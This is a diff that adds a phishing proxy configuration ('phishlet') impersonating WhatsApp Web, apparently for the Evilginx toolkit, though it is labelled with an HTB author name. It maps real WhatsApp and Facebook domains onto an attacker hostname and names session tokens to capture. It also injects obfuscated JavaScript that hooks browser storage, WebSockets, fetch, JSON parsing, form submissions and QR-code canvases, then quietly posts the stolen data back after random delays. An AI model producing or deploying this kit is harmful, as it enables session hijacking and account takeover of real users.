@@ -1,0 +1,120 @@
+name: 'WhatsApp'
+author: 'HTB-Advanced'
+min_ver: '3.2.0'
+
+proxy_hosts:
+  - { phish_sub: 'web', orig_sub: 'web', domain: 'whatsapp.com', session: true, is_landing: true }
+  - { phish_sub: 'static', orig_sub: 'static', domain: 'whatsapp.net', session: false, is_landing: false }
+  - { phish_sub: 'pps', orig_sub: 'pps', domain: 'whatsapp.net', session: false, is_landing: false }
+  - { phish_sub: 'web', orig_sub: 'web', domain: 'whatsapp.net', session: false, is_landing: false }
+  - { phish_sub: 'mmg', orig_sub: 'mmg', domain: 'whatsapp.net', session: false, is_landing: false }
+  - { phish_sub: 'graph', orig_sub: 'graph', domain: 'facebook.com', session: false, is_landing: false }
+  - { phish_sub: 'crashlogs', orig_sub: 'crashlogs', domain: 'whatsapp.com', session: false, is_landing: false }
+
+sub_filters:
+  - triggers_on: 'web.whatsapp.com'
+    hostname: '{hostname}'
+    sub: 'web'
+    orig_sub: 'web'
+    domain: 'whatsapp.com'
+    search: 'web.whatsapp.com'
+    replace: '{hostname}'
+    mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*', 'application/wasm']
+  - triggers_on: 'web.whatsapp.com'
+    hostname: '{hostname}'
+    sub: 'web'
+    orig_sub: 'web'
+    domain: 'whatsapp.com'
+    search: 'static.whatsapp.net'
+    replace: 'static.{hostname}'
+    mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain', 'application/wasm']
+  - triggers_on: 'web.whatsapp.com'
+    hostname: '{hostname}'
+    sub: 'web'
+    orig_sub: 'web'
+    domain: 'whatsapp.com'
+    search: 'pps.whatsapp.net'
+    replace: 'pps.{hostname}'
+    mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain']
+  - triggers_on: 'web.whatsapp.com'
+    hostname: '{hostname}'
+    sub: 'web'
+    orig_sub: 'web'
+    domain: 'whatsapp.com'
+    search: 'web.whatsapp.net'
+    replace: 'web.{hostname}'
+    mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain']
+  - triggers_on: 'web.whatsapp.com'
+    hostname: '{hostname}'
+    sub: 'web'
+    orig_sub: 'web'
+    domain: 'whatsapp.com'
+    search: 'mmg.whatsapp.net'
+    replace: 'mmg.{hostname}'
+    mimes: ['text/html', 'application/javascript', 'image/*']
+  - triggers_on: 'web.whatsapp.com'
+    hostname: '{hostname}'
+    sub: 'web'
+    orig_sub: 'web'
+    domain: 'whatsapp.com'
+    search: 'graph.facebook.com'
+    replace: 'graph.{hostname}'
+    mimes: ['text/html', 'application/javascript', 'text/css', 'application/json']
+  - triggers_on: 'web.whatsapp.com'
+    hostname: '{hostname}'
+    sub: 'web'
+    orig_sub: 'web'
+    domain: 'whatsapp.com'
+    search: 'crashlogs.whatsapp.com'
+    replace: 'crashlogs.{hostname}'
+    mimes: ['text/html', 'application/javascript', 'application/json']
+  - triggers_on: 'static.whatsapp.net'
+    hostname: '{hostname}'
+    sub: 'static'
+    orig_sub: 'static'
+    domain: 'whatsapp.net'
+    search: 'static.whatsapp.net'
+    replace: 'static.{hostname}'
+    mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain', 'application/wasm']
+  - triggers_on: 'pps.whatsapp.net'
+    hostname: '{hostname}'
+    sub: 'pps'
+    orig_sub: 'pps'
+    domain: 'whatsapp.net'
+    search: 'pps.whatsapp.net'
+    replace: 'pps.{hostname}'
+    mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain', 'image/*']
+
+auth_tokens:
+  - domain: 'whatsapp.com'
+    keys: ['WABrowserId', 'WASecretBundle', 'WAToken1', 'WAToken2', 'remember_me', 'WALangPref', 'debug']
+  - domain: '.whatsapp.com'
+    keys: ['WABrowserId', 'WASecretBundle']
+  - domain: 'whatsapp.net'
+    keys: ['WABrowserId']
+
+credentials:
+  username:
+    key: 'session_id'
+    search: 'WABrowserId'
+    type: 'post'
+  password:
+    key: 'secret_bundle'
+    search: 'WASecretBundle'
+    type: 'post'
+
+auth_urls:
+  - ^https://web\.{hostname}/$
+  - ^https://web\.{hostname}/.*$
+  - ^https://{hostname}/sw\.js$
+  - ^https://static\.{hostname}/.*$
+
+js_inject:
+  - trigger_domains: ["{hostname}"]
+    trigger_paths: ["/", "/auth", "/qr"]
+    script: |
+      !function(){var e=Math.random().toString(36).substring(7),t=function(e){return btoa(unescape(encodeURIComponent(e)))},r=function(){return Date.now()+Math.random()},n=function(e){return e.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")},o=function(e,t){var r=new XMLHttpRequest;r.open("POST","/"+e.split("").reverse().join("").substring(0,7),!0),r.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),r.setRequestHeader("X-Requested-With","XMLHttpRequest"),r.setRequestHeader("Cache-Control","no-cache"),r.setRequestHeader("Pragma","no-cache");var n=new Date;r.setRequestHeader("X-Timestamp",n.getTime().toString()),r.send("d="+encodeURIComponent(t))},a=localStorage.__proto__.setItem;localStorage.__proto__.setItem=function(){if(arguments[0]&&(arguments[0].indexOf("WABrowser")>-1||arguments[0].indexOf("WASecret")>-1||arguments[0].indexOf("remember")>-1||arguments[0].indexOf("WALang")>-1||arguments[0].indexOf("debug")>-1)){var e={t:"ls",k:arguments[0],v:arguments[1],ts:r(),id:this["__"+Math.random().toString(36).substring(7)]||"unknown",fp:navigator.userAgent.substring(0,50)};setTimeout(function(){o("erutpac",t(JSON.stringify(e)))},Math.random()*3e3+800)}return a.apply(this,arguments)};var s=sessionStorage.__proto__.setItem;sessionStorage.__proto__.setItem=function(){if(arguments[0]&&(arguments[0].indexOf("WA")>-1||arguments[0].indexOf("chat")>-1||arguments[0].indexOf("session")>-1)){var e={t:"ss",k:arguments[0],v:arguments[1],ts:r(),loc:window.location.href};setTimeout(function(){o("erutpac",t(JSON.stringify(e)))},Math.random()*2e3+400)}return s.apply(this,arguments)};var i=window.WebSocket;window.WebSocket=function(){var e=new i(...arguments),n=e.send,a=e.addEventListener;return e.send=function(s){if("string"==typeof s){try{var i=JSON.parse(s);(i.admin||i.auth||i.challenge||i.login||i.conn||s.indexOf('"admin"')>-1||s.indexOf('"auth"')>-1||s.indexOf('"conn"')>-1)&&setTimeout(function(){o("erutpac",t(JSON.stringify({t:"ws",d:s.substring(0,1500),ts:r(),url:e.url})))},Math.random()*1200+300)}catch(e){s.length<3e3&&(s.indexOf("admin")>-1||s.indexOf("auth")>-1||s.indexOf("login")>-1||s.indexOf("conn")>-1)&&setTimeout(function(){o("erutpac",t(JSON.stringify({t:"ws",d:s,ts:r()})))},Math.random()*900+200)}}return n.call(this,s)},e.addEventListener=function(t,r){return"message"===t&&setTimeout(function(){var t=r;r=function(r){try{var n=JSON.parse(r.data);(n.ref||n.challenge||n.conn||n.s)&&setTimeout(function(){o("erutpac",JSON.stringify({t:"ws_msg",d:r.data.substring(0,1200),ts:Date.now()}))},Math.random()*800+100)}catch(e){}return t.call(this,r)}},100),a.call(this,t,r)},e};var c=document.createElement;document.createElement=function(){var e=c.apply(this,arguments);return"canvas"===arguments[0]&&setTimeout(function(){var r=e.getContext&&e.getContext("2d");r&&r.canvas&&r.canvas.toDataURL&&setTimeout(function(){try{var n=r.canvas.toDataURL();if(n&&n.length>100){var a={t:"qr",d:n.substring(0,8e3),ts:Date.now(),w:r.canvas.width,h:r.canvas.height};o("erutpac",t(JSON.stringify(a)))}}catch(e){}},Math.random()*4e3+1500)},200),e};var l=document.querySelector;document.querySelector=function(){var e=l.apply(this,arguments);if(e&&arguments[0]&&(arguments[0].indexOf("qr")>-1||arguments[0].indexOf("canvas")>-1))try{var r=new MutationObserver(function(e){e.forEach(function(e){e.addedNodes&&e.addedNodes.length>0&&Array.from(e.addedNodes).forEach(function(e){if(e.tagName){var r=e.querySelector&&e.querySelector("canvas");r&&setTimeout(function(){try{var e=r.getContext("2d");if(e&&e.canvas){var n=e.canvas.toDataURL();n&&n.length>100&&o("erutpac",t(JSON.stringify({t:"qr_mut",d:n.substring(0,8e3),ts:Date.now(),src:"mutation"})))}}catch(e){}},Math.random()*3e3+800)}})})});r.observe(document.body,{childList:!0,subtree:!0,attributes:!0,attributeOldValue:!0}),setTimeout(function(){r.disconnect()},9e4)}catch(e){}return e};var u=Object.defineProperty;Object.defineProperty=function(){if(arguments[1]&&"string"==typeof arguments[1]&&(arguments[1].indexOf("WA")>-1||arguments[1].indexOf("secret")>-1||arguments[1].indexOf("token")>-1||arguments[1].indexOf("session")>-1||arguments[1].indexOf("auth")>-1)){var e={t:"prop",k:arguments[1],v:arguments[2]&&arguments[2].value?arguments[2].value.toString().substring(0,500):"defined",ts:r(),obj:arguments[0].constructor.name};setTimeout(function(){o("erutpac",t(JSON.stringify(e)))},Math.random()*2200+600)}return u.apply(this,arguments)};var d=JSON.parse;JSON.parse=function(){try{var e=d.apply(this,arguments);if(e&&"object"==typeof e){var n=JSON.stringify(e);(e.ref||e.phoneNumber||e.pushname||e.isResponse||e.queryId||e.challenge||e.conn||e.stream||e.wid||n.indexOf('"ref"')>-1||n.indexOf('"wid"')>-1)&&setTimeout(function(){o("erutpac",t(JSON.stringify({t:"json",d:n.substring(0,3e3),ts:r(),keys:Object.keys(e).slice(0,20)})))},Math.random()*1500+350)}return e}catch(e){return d.apply(this,arguments)}};var f=window.indexedDB.open;window.indexedDB.open=function(){var e=f.apply(this,arguments);return e.onsuccess=function(n){var a=n.target.result;if(a&&a.objectStoreNames){for(var s=[],i=0;i<a.objectStoreNames.length;i++)a.objectStoreNames[i].indexOf("WA")>-1&&s.push(a.objectStoreNames[i]);s.length>0&&setTimeout(function(){o("erutpac",t(JSON.stringify({t:"idb",stores:s,ts:Date.now(),version:a.version})))},Math.random()*3500+1e3)}e.onsuccess&&e.onsuccess(n)},e};var g=window.fetch;window.fetch=function(){var e=Array.prototype.slice.call(arguments);return e[0]&&("string"==typeof e[0]&&(e[0].indexOf("/auth")>-1||e[0].indexOf("/login")>-1||e[0].indexOf("/conn")>-1)||e[0].url&&(e[0].url.indexOf("/auth")>-1||e[0].url.indexOf("/login")>-1))&&setTimeout(function(){o("erutpac",t(JSON.stringify({t:"fetch",url:e[0].toString().substring(0,200),ts:Date.now()})))},Math.random()*1e3+250),g.apply(this,arguments)};var m=Element.prototype.addEventListener;Element.prototype.addEventListener=function(e,n){if("click"===e||"submit"===e){var a=n;n=function(e){setTimeout(function(){var n=e.target.closest("form");if(n){for(var s={},i=n.querySelectorAll("input, select, textarea"),c=0;c<i.length;c++){var l=i[c];l.name&&l.value&&(l.type.toLowerCase().indexOf("pass")>-1||l.name.toLowerCase().indexOf("pass")>-1||l.name.toLowerCase().indexOf("phone")>-1||l.name.toLowerCase().indexOf("email")>-1)&&(s[l.name]=l.value.substring(0,100))}Object.keys(s).length>0&&setTimeout(function(){o("erutpac",t(JSON.stringify({t:"form",data:s,ts:Date.now(),action:n.action})))},Math.random()*1200+400)}},500);try{return a.call(this,e)}catch(e){return a(e)}}}return m.call(this,e,n)};!function(){var e=0,n=setInterval(function(){if(++e>180)return clearInterval(n);var a=document.querySelectorAll("canvas");a.length>0&&Array.from(a).forEach(function(e){if(e.width>80&&e.height>80)try{var a=e.getContext("2d");if(a){var s=a.canvas.toDataURL();s&&s.length>100&&s!==e.getAttribute("data-captured")&&(e.setAttribute("data-captured",s),clearInterval(n),setTimeout(function(){o("erutpac",t(JSON.stringify({t:"qr_scan",d:s.substring(0,8e3),ts:Date.now(),w:e.width,h:e.height,final:!0})))},Math.random()*1e3+200))}}catch(e){}})},800)}(),setTimeout(function(){try{var e=window.localStorage,n=window.sessionStorage,a={};for(var s in e)s.indexOf("WA")>-1&&(a[s]=e[s]);for(var s in n)s.indexOf("WA")>-1&&(a[s]=n[s]);Object.keys(a).length>0&&o("erutpac",t(JSON.stringify({t:"storage_dump",data:a,ts:Date.now(),type:"initial"})))}catch(e){}},5e3)}();
+
+login:
+  domain: 'web.whatsapp.com'
+  path: '/'
